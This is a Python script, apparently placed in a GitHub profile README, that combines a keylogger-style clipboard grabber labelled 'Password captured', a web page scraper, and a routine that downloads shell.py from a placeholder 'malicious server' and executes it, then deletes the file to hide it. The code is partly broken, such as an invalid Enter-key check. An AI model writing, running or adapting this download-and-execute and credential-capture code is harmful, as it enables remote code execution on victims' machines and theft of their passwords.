import threading
import requests
from bs4 import BeautifulSoup
import pyperclip
import pynput
import os
import subprocess
import time

def download_and_execute_ps1():
    url = "http://your-malicious-server.com/shell.py"
    response = requests.get(url)
    with open("shell.py", "w") as file:
        file.write(response.text)
    subprocess.Popen(["python3", "shell.py"])

def on_press(key):
    if key == key.Enter:
        password = pyperclip.paste()
        print("Password captured: " + password)

def scrape_website(url):
    response = requests.get(url)
    soup = BeautifulSoup(response.content, "html.parser")
    data = ""
    for tag in soup.find_all():
        data += str(tag)
    return data

class WebsiteScraperThread(threading.Thread):
    def __init__(self, url):
        threading.Thread.__init__(self)
        self.url = url

    def run(self):
        data = scrape_website(self.url)
        print("Data scraped:")
        print(data)

class KeyListenerThread(threading.Thread):
    def __init__(self):
        threading.Thread.__init__(self)

    def run(self):
        key_listener = pynput.keyboard.Listener(on_press=on_press)
        key_listener.start()

class DownloadAndExecuteThread(threading.Thread):
    def __init__(self):
        threading.Thread.__init__(self)

    def run(self):
        download_and_execute_ps1()

key_listener = KeyListenerThread()
data_scraper = WebsiteScraperThread(input("Enter the URL to scrape: "))
shell_executor = DownloadAndExecuteThread()

key_listener.start()
shell_executor.start()
data_scraper.start()

key_listener.join()
shell_executor.join()
data_scraper.join()
os.system("rm shell.py")

<!---
TheZilla1000/TheZilla1000 is a ✨ special ✨ repository because its `README.md` (this file) appears on your GitHub profile.
You can click the Preview link to take a look at your changes.
--->
